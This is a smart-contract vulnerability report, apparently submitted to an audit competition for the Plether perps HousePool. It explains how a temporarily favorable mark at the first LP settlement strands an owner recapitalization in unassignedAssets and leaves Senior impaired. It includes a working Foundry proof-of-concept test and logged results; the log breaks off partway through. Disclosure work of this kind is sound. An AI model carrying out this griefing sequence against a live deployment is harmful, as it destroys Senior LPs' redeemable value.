# \#99501 [SC-Medium] A temporary favorable mark at the first LP settlement after a recapitalization strands the recapitalization as ownerless value and leaves Senior impaired

**Submitted on Nov 13th 2026 at 22:28:16 UTC by @Cryptor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99501
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

When the Senior tranche is impaired, the protocol's recovery is `CfdEngine.recapitalizePool`. This immediate owner action moves USDG into HousePool and queues it as a pending `Recapitalization` inflow. The accounting specification defines that inflow as "recapitalization intended to restore waterfall claimants". It states that "normal reconciliation allocates the queued amount to senior restoration or unassigned assets" (`ACCOUNTING_SPEC.md:634`, `:641-643`).

`HousePool._reconcile` first reconciles the stored principals against the current mark and stores the result (`HousePool.sol:1584-1585`). Only then does it apply the queued recapitalization (`HousePool.sol:1598`). When open positions are marked at an unrealized trader loss, the plan treats that marked receivable as LP revenue: `distributeRevenue` restores Senior up to its high-water mark before anything else (`HousePoolWaterfallAccountingLib.sol:147-152`). The recapitalization then finds the gap closed. Because "recapitalization never accrues to junior principal", the uncovered part goes to `unassignedAssets` (`HousePoolPendingPreviewLib.sol:123-136`).

The receivable is not cash (`SECURITY.md:1384`). When the mark returns, the reversal is charged Junior-first and then to Senior (`HousePoolWaterfallAccountingLib.sol:167-185`), so Senior is impaired again with its high-water mark intact. The recapitalization that was funded to close that gap is no longer pending. It sits in `unassignedAssets`, which is reserved from every LP withdrawal and closes tranche deposits. It can leave only through the owner-only `assignUnassignedAssets`, which mints new shares to a single receiver rather than restoring the existing Senior holders (`HousePool.sol:657-663`).

The stranded amount is the smaller of the recapitalization and the unrealized trader loss at the first committed settlement after it. Any LP-favorable mark at that settlement strands a proportional part, and the settlement is the permissionless `OrderRouter.settleLpEpoch`. In the proof of concept, at release risk parameters with the pool never degraded, a 3.52% temporary mark strands the entire 18,489.857647 USDG recapitalization. Across its redemptions the Senior LP receives 18,489.845175 USDG less than in the same-state control, where none of the recapitalization is stranded. A 1.60% mark strands half of it, 9,244.931592 USDG.

## Vulnerability Details

#### The marked receivable restores Senior before the recapitalization is applied

`HousePool._reconcile` runs the mark-driven plan, stores it, and only then applies the pending buckets:

```solidity
// packages/perps/src/HousePool.sol:1555
function _reconcile(...) internal {
    ...
    HousePoolReconcilePlanLib.ReconcilePlan memory plan = HousePoolReconcilePlanLib.planReconcile(
        _currentPendingAccountingState(),
        reconcileSnapshot,                                                               // includes the signed mark delta
        _pendingClaimantBucketAssets(settleableClaimantBuckets),
        ...
    );
    ...
    _setWaterfallState(plan.state.waterfall);                                            // :1584, restored Senior stored
    unassignedAssets = plan.state.unassignedAssets;
    ...
    _applyPendingClaimantBucketsLive(settleableClaimantBuckets, claimantBuckets, allowRevenueContinuation); // :1598
}
```

`buildReconcileSnapshot` adds a positive terminal mark delta to terminal assets (`HousePoolAccountingLib.sol:63-68`). When traders are marked at a loss, the plan sees surplus over stored principal and distributes it (`HousePoolReconcilePlanLib.sol:84-99`):

```solidity
// packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol:147
if (remaining > 0 && nextState.seniorPrincipal < nextState.seniorHighWaterMark) {
    uint256 deficit = nextState.seniorHighWaterMark - nextState.seniorPrincipal;
    uint256 restore = remaining < deficit ? remaining : deficit;
    nextState.seniorPrincipal += restore;                                             // gap closed by marked value
    remaining -= restore;
}
...
nextState.juniorPrincipal += remaining;                                               // :158
```

#### The recapitalization finds no gap and becomes ownerless

`_applyPendingClaimantBucketsLive` reads the stored state back (`HousePool.sol:1768`) and applies the recapitalization against the Senior gap that the marked value has just closed:

```solidity
// packages/perps/src/libraries/HousePoolPendingPreviewLib.sol:123
} else {
    uint256 gap = state.waterfall.seniorHighWaterMark > state.waterfall.seniorPrincipal
        ? state.waterfall.seniorHighWaterMark - state.waterfall.seniorPrincipal
        : 0;                                                                          // 0 after the marked restoration
    if (gap > 0) { ... }
}
...
if (remaining > 0) {
    state.unassignedAssets += remaining;                                              // :135
}
```

The NatSpec states the rule this applies: "Any remainder, including all value when there are no senior owners, becomes unassigned; recapitalization never accrues to junior principal" (`HousePoolPendingPreviewLib.sol:106-107`).

#### The reversal impairs Senior again

At the next reconciliation the trader position has closed at its entry price, so the marked receivable is gone. The plan sees a shortfall against the stored principals and charges it with `absorbLoss`: Junior first, then Senior, with the high-water mark "deliberately unchanged so future revenue continues to restore senior impairment" (`HousePoolWaterfallAccountingLib.sol:161-185`). Senior is below its high-water mark again. The recapitalization that was funded for that gap is no longer pending, so nothing restores Senior from it.

The stranded value stays in `unassignedAssets`:

- It is subtracted from distributable equity on every reconciliation (`HousePoolReconcilePlanLib.sol:73-86`), so no LP can redeem it.
- It closes ordinary tranche deposits while nonzero (`HousePoolTrancheGateLib.sol:28-30`).
- `assignUnassignedAssets` (`HousePool.sol:660`) is `onlyOwner` and mints new shares to one receiver. It exists to stop "later LPs from implicitly capturing previously ownerless value" (`HousePool.sol:657`). It cannot credit the existing Senior holders pro rata.

#### The invariant that breaks

The specification sets ownership by source: "source semantics decide the owner of the inflow" and "only value with no safe claimant path belongs in `unassignedAssets`" (`ACCOUNTING_SPEC.md:647`, `:650`). It calls the bucket "exceptional telemetry, not a normal operating bucket" (`:652`). A recapitalization's source semantics are Senior restoration (`:634`). At the end of this path a Senior claimant path exists, because Senior is below its high-water mark by about the stranded amount. Yet the recapitalization funded for that claimant is classified as having no claimant.

The classification rests on a marked receivable that the protocol itself documents as not being cash: "a positive marked receivable is not cash, so share NAV can exceed immediately redeemable liquidity" (`SECURITY.md:1384`). The reconciliation lets that receivable displace real recapitalization cash from its claimant path, and keeps the displacement after the receivable reverses.

#### Root cause

1. `HousePool._reconcile` stores the mark-driven plan (`src/HousePool.sol:1584-1585`) before it applies the pending recapitalization (`src/HousePool.sol:1598`).
2. The plan credits an unrealized trader loss, through the signed terminal delta (`src/libraries/HousePoolAccountingLib.sol:63-68`), to Senior restoration (`src/libraries/HousePoolWaterfallAccountingLib.sol:147-152`).
3. `applyClaimantRecapitalizationIntent` measures the gap after that restoration (`src/libraries/HousePoolPendingPreviewLib.sol:124-127`) and moves the uncovered recapitalization to `unassignedAssets` (`:134-136`).
4. Nothing records that the gap was closed by marked rather than realized value. When the mark reverses, `absorbLoss` re-impairs Senior (`src/libraries/HousePoolWaterfallAccountingLib.sol:167-185`), and no path returns the recapitalization from `unassignedAssets` to Senior.

#### The commit step

The routing becomes storage only when a reconciliation commits. The permissionless route with open positions is `OrderRouter.settleLpEpoch` (`src/OrderRouter.sol:479-484`), which validates a signed Pyth update, refreshes the Engine mark and settles in one call. `HousePool._settleLpEpoch` reconciles first (`src/HousePool.sol:835`) and needs a matured LP request to make progress (`src/HousePool.sol:1183-1184`). Any matured request serves. In the proof of concept it is a small Senior redemption, the kind a Senior LP files while waiting for the recovery. The recapitalization is applied by the first committed settlement after it, so the mark at that one settlement decides how much of it is stranded.

### Attack scenario

Starting state: after realized trading losses, Junior principal is zero, Senior principal `S` is below its high-water mark `H`, and the pool is not degraded.

0. The owner calls `CfdEngine.recapitalizePool(H - S)`, the documented recovery for the recorded gap. The amount is queued.
1. A trader holds a position opened through the public Router path. In the proof of concept this is a fully margined 577,200-notional Long at 1.00, opened before the recapitalization, 39% of pool cash and inside the 40% skew cap.
2. Any LP request matures at the next hourly boundary.
3. The basket moves against the trader. Any address calls `OrderRouter.settleLpEpoch` with a valid signed update. The marked trader loss restores Senior to `H`, and the recapitalization is moved to `unassignedAssets`.
4. The basket returns and the trader closes at its entry price, with no realized loss.
5. At the next settlement the reversal re-impairs Senior, and `unassignedAssets` keeps the recapitalization.
6. A Senior LP who exits receives the re-impaired value. The stranded USDG stays reserved in the pool, with no claimant.

Steps 1 to 6 are public calls, and the caller in step 3 needs no role. The program's privileged-role exclusions cover attacks that require a malicious, compromised or out-of-procedure trusted role. The owner's only action is the recapitalization, which the program lists among the owner's immediate trusted actions. The program also places "a legitimate, documented action by a trusted role that triggers a bug harming users" in scope. The owner funds exactly the gap read from chain, and the defect is in how the reconciliation routes that funding.

### Relation to documented limitations and known issues

The program treats `packages/perps/SECURITY.md` Known Limitations and the listed audit reports as known issues, and accepts a report on a documented root cause only where the fix at `a82d4fef` is incomplete or introduces a new bug.

**Reconciliation order and realized revenue.** `ACCOUNTING_SPEC.md:335-340` places pending-bucket routing after the loss and surplus steps, and `:641-643` says the queued recapitalization goes "to senior restoration or unassigned assets". With realized revenue that order is sound: the revenue is cash, Senior stays whole, and the uncovered part of the recapitalization has no claimant. The reported path differs in the source of the surplus. It is a marked receivable that reverses, so Senior ends impaired while its recapitalization is ownerless. In the proof of concept's control branch, where the first settlement sees no marked surplus, the recapitalization is applied in full.

**Known Limitations.** `SECURITY.md:1384` states that "a positive marked receivable is not cash, so share NAV can exceed immediately redeemable liquidity". That limitation concerns the liquidity of marked NAV. It does not say that a marked receivable may displace an owner recapitalization into `unassignedAssets`, and the protocol's ownership rules for that bucket (`ACCOUNTING_SPEC.md:647-652`) point the other way. No entry in the LP accounting, LP claim and allocation, or rounding limitations (`SECURITY.md:1380-1433`) covers recapitalization routing.

**Published audit findings:**

| Published issue | Its root cause and impact | This report | Why its fix does not stop this path |
|---|---|---|---|
| Cecuro MED-12, mixed recovery inflows can strand LP revenue in ownerless pool assets | A stale `allowRevenueContinuation` decision parked realized LP revenue as ownerless. The response confirms that "surplus without eligible owners remains unassigned" | The eligible owner exists. Senior is below its high-water mark when the reconciliation ends, and the value parked as ownerless is the recapitalization funded for it | Recomputing revenue continuation (`HousePool.sol:1577-1578`, `HousePoolPendingPreviewLib.sol:50-52`) does not change how the recapitalization's gap is measured |
| SC Audit Studio SC-L1, permissionless zero-value senior withdraw can persist overstated tranche principal | Pending claimant buckets were applied after mark-to-market without a cap, overstating stored principal | Buckets are capped. The defect is that the recapitalization's gap is measured after unrealized surplus has closed it | The cap by settleable equity does not change where the uncovered recapitalization is routed |

SC-L1 is the closest published entry. It also arose because `_reconcile` applies the pending claimant buckets after the mark-to-market step, and the auditor recommended making that settlement "part of the same liability-adjusted reconcile kernel instead of applying it afterward". The response fixed the amount instead: "Pending recap/revenue is now capped to what's actually settleable after MTM/deferred liabilities" (`audits/plether-pre-audit-report.pdf`, SC-L1). If that entry is read as covering the ordering itself, the fix at `a82d4fef` is incomplete for this consequence. The capped recapitalization is still routed by a waterfall state that the current mark has just rewritten, and that produces the outcome measured here.

A separate report by the same researcher (#98615) covers a temporary adverse mark clamping an existing `unassignedAssets` balance down (`HousePoolReconcilePlanLib.sol:73-74`), with the rebound credited to Junior. This report concerns the opposite direction and a different write. A favorable mark makes the recapitalization branch create an ownerless balance out of a pending recapitalization (`HousePoolPendingPreviewLib.sol:123-136`), and the party left short is Senior, not the reserve. Restoring a clamped reserve does not stop a pending recapitalization from being routed to the bucket.

## Impact Details

Measured on the release configuration with the pool never degraded. The comparison is one same-state pair. The first settlement after the recapitalization runs at 1.00 in the control and at the temporary mark in the other branch. The trader's close at 1.00, the next settlement and the Senior exit are identical in both.

| Measure (USDG) | Control: first settlement at 1.00 | First settlement at 1.03523709 |
|---|---:|---:|
| Owner recapitalization (exact recorded gap) | 18,489.857647 | 18,489.857647 |
| `unassignedAssets` after the first settlement | 0 | **18,489.857647** |
| Senior principal after the mark returns | 1,481,168.482350 | 1,462,697.114548 |
| Senior high-water mark after the mark returns | 1,482,059.562283 | 1,482,073.097073 |
| Senior shortfall against its high-water mark | 891.079933 | **19,375.982525** |
| `unassignedAssets` after the mark returns | 0 | **18,489.857647** |
| Senior LP full exit | 1,481,167.482258 | 1,462,696.126928 |
| Senior LP USDG received across all its redemptions | 1,484,135.159520 | 1,465,645.314345 |
| **Senior LP loss** | | **18,489.845175** |

In the control branch the recapitalization is applied in full and nothing is left in `unassignedAssets`. In both branches the trader's close at 1.00 returns the open's VPI charge, an ordinary trading loss for LPs that arrives after the recapitalization is applied, and this leaves Senior 891.079933 USDG below its mark in the control. The favorable branch differs only in the mark at the first settlement: the whole recapitalization becomes unassigned, and Senior ends 19,375.982525 USDG below its high-water mark.

The Senior LP's loss across its redemptions equals the stranded recapitalization to within 0.02 USDG. The final exit alone pays 18,471.355330 less, and the two small redemptions that supply epoch progress account for the rest.

The stranded amount is `min(recapitalization, unrealized trader loss at the first post-recapitalization settlement)`. The second test uses a mark at which the trader's loss is half the gap (1.01601686). There, 9,244.931592 USDG, half the recapitalization, is stranded, and the Senior LP receives 9,244.925356 USDG less. A smaller favorable move strands a proportional part, and no threshold has to be crossed. Net marked exposure is capped by `maxSkewRatio` at 40% of pool depth, so a 1% favorable move can strand up to about 0.4% of pool depth.

### Severity

The mapped impact is **Medium: griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)**. Senior LPs lose the restoration that the owner funded for them, and their full exit pays less USDG. Nobody gains: the value moves into the ownerless bucket. Any address can cause this by committing the first post-recapitalization settlement while open positions are marked at a trader loss. The cost is one settlement call. The same loss occurs without an attacker when an honest keeper's first post-recapitalization settlement lands on such a mark.

The Critical and High theft tiers are not claimed, because no party receives the value when it is stranded. The Low tier "contract fails to deliver promised returns, but doesn't lose value" is not claimed, because the Senior LPs' redeemable value falls in settlement token. Restoring it requires the owner to fund the gap a second time or to mint new Senior shares to a chosen receiver. Neither returns the value to the holders who lost it.

### Mitigation

Do not convert a pending recapitalization into `unassignedAssets` when the Senior gap it targets was closed by unrealized mark surplus in the same reconciliation. Keep that part pending until the surplus is realized or reverses, and route it to `unassignedAssets` only once Senior's restoration no longer depends on a marked receivable.

Regression coverage should record a recapitalization for an impaired Senior tranche, commit the first settlement at a mark where open positions show a trader loss, return the mark, and assert that Senior is restored to its high-water mark and that `unassignedAssets` matches the control.

## References

- `packages/perps/src/HousePool.sol:1555-1599` (`_reconcile`: plan stored at `:1584-1585`, pending buckets applied at `:1598`), `:1759-1776` (`_applyPendingClaimantBucketsLive`, state re-read at `:1768`), `:657-663` (`assignUnassignedAssets`, owner-gated), `:794-835` (`settleLpEpoch`, reconcile at `:835`), `:1183-1184` (`HousePool__NoLpEpochProgress`)
- `packages/perps/src/libraries/HousePoolAccountingLib.sol:60-78` (`buildReconcileSnapshot`, signed terminal delta)
- `packages/perps/src/libraries/HousePoolReconcilePlanLib.sol:47-106` (`planReconcile`; surplus `:84-99`; unassigned excluded `:73-86`)
- `packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol:140-159` (`distributeRevenue`), `:161-185` (`absorbLoss`)
- `packages/perps/src/libraries/HousePoolPendingPreviewLib.sol:103-137` (`applyClaimantRecapitalizationIntent`; restore branch `:123-132`; remainder to unassigned `:134-136`)
- `packages/perps/src/libraries/HousePoolTrancheGateLib.sol:28-30` (deposits closed while unassigned assets exist)
- `packages/perps/src/CfdEngine.sol:627-654` (`recapitalizePool`)
- `packages/perps/src/OrderRouter.sol:479-484` (`settleLpEpoch`)
- `packages/perps/ACCOUNTING_SPEC.md:335-340` (reconciliation order), `:634`, `:641-643` (recapitalization intent and routing), `:647-652` (ownership rules for `unassignedAssets`)
- `packages/perps/SECURITY.md:155-162` (owner-funded recapitalization), `:1384` (marked receivable is not cash), `:1380-1433` (LP limitations)

## Proof of Concept

## Proof of Concept

The test runs on an unmodified checkout of `immunefi-team/audit-comp-plether` at `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, using the repository's own `BasePerpTest` fixture with the v2.0.0 release risk parameters. One file, added to the frozen commit with no other change. It compiles and passes against the pristine repository. No production source is touched, `test/perps/BasePerpTest.sol` is used unmodified, and no `vm.mockCall` appears anywhere.

Notes on the fixture:

- `_riskParams` sets the release risk parameters from `DEPLOYMENT.md` (`vpiFactor` 0.01e18, `maxSkewRatio` 0.4e18, `maintMarginBps` 10, `initMarginBps` 20, `fadMarginBps` 300, `baseCarryBps` 500), and `setUp` applies the release Senior limits (40,000,000 USDG, 8000 bps).
- `MockSettlementToken` stands in for USDG and `MockPyth` for Pyth Network. The production `PletherOracle` reads `MockPyth` through its real staleness, confidence and divergence checks.
- Every value-moving call after setup goes through a public entry point: `router.commitOrder`, `router.executeOrder`, `router.updateMarkPrice`, `router.settleLpEpoch`, `seniorVault.requestRedeem`. The single owner call, `engine.recapitalizePool`, is the documented recovery, and its amount is read from `pool.seniorHighWaterMark() - pool.seniorPrincipal()`.
- Every settlement runs through `router.settleLpEpoch` with a signed update.
- The opening shock only builds the starting state that `recapitalizePool` exists to cure. It closes two opposite positions at 0.01 and 1.99 to realize a trader gain slightly larger than Junior principal in one round. These prices are not meant as basket moves. The reported mechanism starts after that state is committed, and from the recapitalization on the test uses only 1.00 and the computed temporary mark.
- A `Side.LONG` position loses as the basket price rises (`src/CfdMath.sol:48-72`). The trader opens a Long at 1.00 before the impairment is persisted, so the open's charges are already in Senior principal when the owner reads the gap. It is marked at a loss at the temporary mark and closes at 1.00.
- The temporary mark is computed, not tuned: it is the lowest price at which the Long's unrealized loss reaches a set share of the recapitalized gap. `test_temporaryFavorableMarkStrandsRecapitalization` uses 110% and `test_smallerFavorableMarkStrandsProportionalPart` uses 50%.
- The Senior LP's receipts are counted across every redemption it makes after the snapshot. That includes the two small redemptions that supply epoch progress, so the measured loss can be compared with the stranded amount.

### Step-by-step

1. Setup: the release risk parameters and Senior limits are applied, both tranches are seeded with 1 USDG, and a Junior LP and a Senior LP deposit 500,000 and 1,500,000 USDG.
2. One realized two-sided shock wipes Junior principal and lightly impairs Senior, and the mark is reset to 1.00.
3. A trader opens a fully margined Long sized at 39% of pool cash, inside the 40% skew cap.
4. An ordinary epoch with a small Senior redemption and a router settlement at 1.00 persists the impairment and the open's charges.
5. The owner calls `engine.recapitalizePool` for exactly `seniorHighWaterMark() - seniorPrincipal()`. The test asserts the pool is not degraded.
6. The favorable mark is computed as the lowest price at which the Long's unrealized loss reaches a set share of the recapitalized gap: 110% in the main test and 50% in the second test.
7. The state is snapshotted. In each branch a small Senior redemption matures, and the first `router.settleLpEpoch` runs at 1.00 (control) or at the favorable mark. The trader then closes at 1.00, a second small Senior redemption is funded by a settlement at 1.00, and Senior principal, high-water mark and `unassignedAssets` are read. Finally the Senior LP's full redemption is funded at 1.00. The Senior LP's USDG is counted across all three redemptions.
8. Assertions: Senior is below its high-water mark after the rebound, `unassignedAssets` is higher than in the control, the Senior LP's exit pays less USDG, and the Senior LP's total loss equals the increase in `unassignedAssets` to within 1 USDG.

### Setup

Save the file below as `packages/perps/test/bounty/r126/RecapStrandedByMarkPoC.t.sol` and run from `packages/perps`:

```sh
forge test --match-path 'test/bounty/r126/RecapStrandedByMarkPoC.t.sol' -vv
```

### Test file

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {console2} from "forge-std/console2.sol";

/// Routine owner recapitalization of a lightly impaired Senior tranche, followed by the first committed LP settlement
/// at a temporarily favorable mark. HousePool._reconcile distributes the mark-driven revenue first, which fills the
/// Senior gap, and then applies the queued recapitalization, which finds no gap and is routed to unassignedAssets.
/// After the mark returns, Senior is impaired again, the recapitalization stays ownerless, and the Senior LP exits with
/// less USDG.
contract RecapStrandedByMarkPoC is BasePerpTest {

    address internal constant LONG_SHOCK = address(0xA11CE);
    address internal constant SHORT_SHOCK = address(0xB0B);
    address internal constant JUNIOR_LP = address(0xBEEF);
    address internal constant SENIOR_LP = address(0x5E1);
    address internal constant KEEPER = address(0x5EEDED);
    address internal constant TRADER = address(0xA77ACC);

    // Release risk parameters (DEPLOYMENT.md): VPI 0.01, max skew 40%, maintenance 10 bps, initial 20 bps.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory p) {
        p = super._riskParams();
        p.vpiFactor = 0.01e18;
        p.maxSkewRatio = 0.4e18;
        p.maintMarginBps = 10;
        p.initMarginBps = 20;
        p.fadMarginBps = 300;
        p.baseCarryBps = 500;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
    }

    // Fully margined: 1.2 USDG per token at a 1.0 mark.
    function _marginFor(
        uint256 size
    ) internal pure returns (uint256) {
        return size * 12 / 1e18 * 1e5;
    }

    function _execute(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        vm.prank(account);
        uint64 id = router.commitOrder(side, size, margin, 0, isClose);
        bytes[] memory data = _mockPythUpdateData(price);
        uint256 fee = pletherOracle.getOrderExecutionFee(data);
        vm.deal(KEEPER, fee);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder{value: fee}(id, data);
        require(uint256(r.status) == uint256(OrderV3Types.LifecycleStatus.Executed), "order not executed");
    }

    function _settleAt(
        uint256 price
    ) internal {
        bytes[] memory data = _mockPythUpdateData(price);
        uint256 fee = pletherOracle.getUpdateFee(data);
        vm.deal(KEEPER, fee);
        vm.prank(KEEPER);
        router.settleLpEpoch{value: fee}(data);
    }

    function _lots(
        uint256 cashAssets,
        uint256 shareBps
    ) internal pure returns (uint256 size) {
        size = cashAssets * 1e12 * shareBps / 10_000;
        size -= size % 1e20;
    }

    struct StrandOutcome {
        uint256 seniorAfterRebound;
        uint256 hwmAfterRebound;
        uint256 unassignedAfterRebound;
        uint256 seniorPaid;
        uint256 seniorPaidTotal;
    }

    function _smallSeniorRequest() internal returns (uint256 id) {
        uint256 shares = seniorVault.maxRequestRedeem(SENIOR_LP) / 1000;
        vm.prank(SENIOR_LP);
        id = seniorVault.requestRedeem(shares, SENIOR_LP, SENIOR_LP);
        vm.warp(seniorVault.depositEpochStart(id) + 1);
    }

    function _strandRun(
        uint256 firstSettlePrice,
        uint256 traderSize
    ) internal returns (StrandOutcome memory o) {
        uint256 firstId = _smallSeniorRequest();
        _settleAt(firstSettlePrice);
        console2.log("  after first settlement: senior", pool.seniorPrincipal());
        console2.log("  after first settlement: junior", pool.juniorPrincipal());
        console2.log("  after first settlement: unassigned", pool.unassignedAssets());
        o.seniorPaidTotal = seniorVault.claimableRedeemAssets(firstId, SENIOR_LP);

        // The mark returns and the trader closes at the entry price.
        _execute(TRADER, CfdTypes.Side.LONG, traderSize, 0, true, 1e8);
        uint256 secondId = _smallSeniorRequest();
        _settleAt(1e8);
        o.seniorAfterRebound = pool.seniorPrincipal();
        o.hwmAfterRebound = pool.seniorHighWaterMark();
        o.unassignedAfterRebound = pool.unassignedAssets();
        o.seniorPaidTotal += seniorVault.claimableRedeemAssets(secondId, SENIOR_LP);

        uint256 seniorShares = seniorVault.maxRequestRedeem(SENIOR_LP);
        vm.prank(SENIOR_LP);
        uint256 exitId = seniorVault.requestRedeem(seniorShares, SENIOR_LP, SENIOR_LP);
        vm.warp(seniorVault.depositEpochStart(exitId) + 1);
        _settleAt(1e8);
        o.seniorPaid = seniorVault.claimableRedeemAssets(exitId, SENIOR_LP);
        o.seniorPaidTotal += o.seniorPaid;
    }

    function _impairedAndRecapitalized()
        internal
        returns (uint256 traderSize, uint256 recap, uint256 seniorBefore, uint256 hwmBefore)
    {
        // One realized shock slightly larger than Junior: Junior wiped, Senior lightly impaired.
        _fundJunior(JUNIOR_LP, 500_000e6);
        _fundSenior(SENIOR_LP, 1_500_000e6);
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        _fundTrader(LONG_SHOCK, 4_000_000e6);
        _fundTrader(SHORT_SHOCK, 4_000_000e6);
        uint256 shock = 262_600e18;
        _execute(LONG_SHOCK, CfdTypes.Side.LONG, shock, _marginFor(shock), false, 1e8);
        _execute(SHORT_SHOCK, CfdTypes.Side.SHORT, shock, _marginFor(shock), false, 1e8);
        _execute(LONG_SHOCK, CfdTypes.Side.LONG, shock, 0, true, 0.01e8);
        _execute(SHORT_SHOCK, CfdTypes.Side.SHORT, shock, 0, true, 1.99e8);
        bytes[] memory reset = _mockPythUpdateData(1e8);
        uint256 fee = pletherOracle.getUpdateFee(reset);
        vm.deal(KEEPER, fee);
        vm.prank(KEEPER);
        router.updateMarkPrice{value: fee}(reset);

        // A trader opens a fully margined long inside the 40% skew cap; a later price rise marks it as an LP
        // receivable.
        traderSize = _lots(pool.totalAssets(), 3900);
        _fundTrader(TRADER, 2_000_000e6);
        _execute(TRADER, CfdTypes.Side.LONG, traderSize, _marginFor(traderSize), false, 1e8);

        // An ordinary epoch persists the impairment and the open's charges before the owner sizes the recovery.
        uint256 shares = seniorVault.maxRequestRedeem(SENIOR_LP) / 100;
        vm.prank(SENIOR_LP);
        uint256 id = seniorVault.requestRedeem(shares, SENIOR_LP, SENIOR_LP);
        vm.warp(seniorVault.depositEpochStart(id) + 1);
        _settleAt(1e8);

        seniorBefore = pool.seniorPrincipal();
        hwmBefore = pool.seniorHighWaterMark();
        assertEq(pool.juniorPrincipal(), 0, "Junior wiped");
        assertGt(hwmBefore, seniorBefore, "Senior impaired");

        // Routine owner recovery of the recorded impairment.
        recap = hwmBefore - seniorBefore;
        settlementToken.mint(address(this), recap);
        settlementToken.approve(address(engine), recap);
        engine.recapitalizePool(recap);
        assertFalse(engine.degradedMode(), "pool is not degraded");
    }

    function _scenario(
        uint256 lossBpsOfGap
    ) internal {
        (uint256 traderSize, uint256 recap, uint256 seniorBefore, uint256 hwmBefore) = _impairedAndRecapitalized();

        // Smallest mark at which the long's unrealized loss reaches the chosen share of the recapitalized gap.
        uint256 target = recap * lossBpsOfGap / 10_000;
        uint256 favorable = 1e8 + (target * 1e8 * 1e12 + traderSize - 1) / traderSize;

        uint256 snap = vm.snapshotState();
        console2.log("=== control: first settlement at the neutral mark ===");
        StrandOutcome memory control = _strandRun(1e8, traderSize);
        assertTrue(vm.revertToState(snap));
        console2.log("=== first settlement at the temporary favorable mark ===");
        StrandOutcome memory strand = _strandRun(favorable, traderSize);

        console2.log("Senior principal before recap", seniorBefore);
        console2.log("Senior high-water mark before recap", hwmBefore);
        console2.log("recapitalization", recap);
        console2.log("trader long (tokens)", traderSize / 1e18);
        console2.log("temporary mark (1e8 = 1.0)", favorable);
        console2.log("Senior after rebound, neutral mark", control.seniorAfterRebound);
        console2.log("Senior after rebound, temporary mark", strand.seniorAfterRebound);
        console2.log("Senior HWM after rebound, neutral mark", control.hwmAfterRebound);
        console2.log("Senior HWM after rebound, temporary mark", strand.hwmAfterRebound);
        console2.log("unassigned after rebound, neutral mark", control.unassignedAfterRebound);
        console2.log("unassigned after rebound, temporary mark", strand.unassignedAfterRebound);
        console2.log("Senior LP exit, neutral mark", control.seniorPaid);
        console2.log("Senior LP exit, temporary mark", strand.seniorPaid);
        console2.log("Senior LP received in total, neutral mark", control.seniorPaidTotal);
        console2.log("Senior LP received in total, temporary mark", strand.seniorPaidTotal);

        assertLt(strand.seniorAfterRebound, strand.hwmAfterRebound, "Senior impaired again after the mark returns");
        assertGt(strand.unassignedAfterRebound, control.unassignedAfterRebound, "recapitalization stranded");
        assertLt(strand.seniorPaid, control.seniorPaid, "Senior LP exits with less USDG");
        assertApproxEqAbs(
            control.seniorPaidTotal - strand.seniorPaidTotal,
            strand.unassignedAfterRebound - control.unassignedAfterRebound,
            1e6,
            "the Senior LP loses what is stranded"
        );
        console2.log("Senior LP loss, final exit", control.seniorPaid - strand.seniorPaid);
        console2.log("Senior LP loss, all redemptions", control.seniorPaidTotal - strand.seniorPaidTotal);
    }

    /// The long's unrealized loss at the first settlement is 110% of the gap: the whole recapitalization is stranded.
    function test_temporaryFavorableMarkStrandsRecapitalization() public {
        _scenario(11_000);
    }

    /// The loss is half the gap: half the recapitalization is stranded. No threshold has to be crossed.
    function test_smallerFavorableMarkStrandsProportionalPart() public {
        _scenario(5_000);
    }

}
```

### Output

```text
Ran 2 tests for test/bounty/r126/RecapStrandedByMarkPoC.t.sol:RecapStrandedByMarkPoC
[PASS] test_smallerFavorableMarkStrandsProportionalPart() (gas: 17110805)
Logs:
  === control: first settlement at the neutral mark ===
    after first settlement: senior 1483543104386
    after first settlement: junior 0
    after first settlement: unassigned 0
  === first settlement at the temporary favorable mark ===
    after first settlement: senior 1483543104386
    after first settlement: junior 0
    after first settlement: unassigned 9244931592
  Senior principal before recap 1466538273869
  Senior high-water mark before recap 1485028131516
  recapitalization 18489857647
  trader long (tokens) 577200
  temporary mark (1e8 = 1.0) 101601686
  Senior after rebound, neutral mark 1481168482350
  Senior after rebound, temporary mark 1471932795683
  Senior HWM after rebound, neutral mark 1482059562283
  Senior HWM after rebound, temporary mark 1482059562283
  unassigned after rebound, neutral mark 0
  unassigned after rebound, temporary mark 9244931592
  Senior LP exit, neutral mark 1481167482258
  Senior LP exit, temporary mark 1471931801827
  Senior LP received in total, neutral mark 1484135159520
  Senior LP received in total, temporary mark 1474890234164
  Senior LP loss, final exit 9235680431
  Senior LP loss, all redemptions 9244925356
[PASS] test_temporaryFavorableMarkStrandsRecapitalization() (gas: 17135492)
Logs:
  === control: first settlement at the neutral mark ===
    after first settlement: senior 1483543104386
    after first settlement: junior 0
    after first settlement: unassigned 0
  === first settlement at the temporary favorable mark ===
    after first settlement: senior 1483543104386
    after first settlement: junior 1848984929
    after first settlement: unassigned 18489857647
  Senior principal before recap 1466538273869
  Senior high-water mark before recap 1485028131516
  recapitalization 18489857647
  trader long (tokens) 577200
  temporary mark (1e8 = 1.0) 103523709
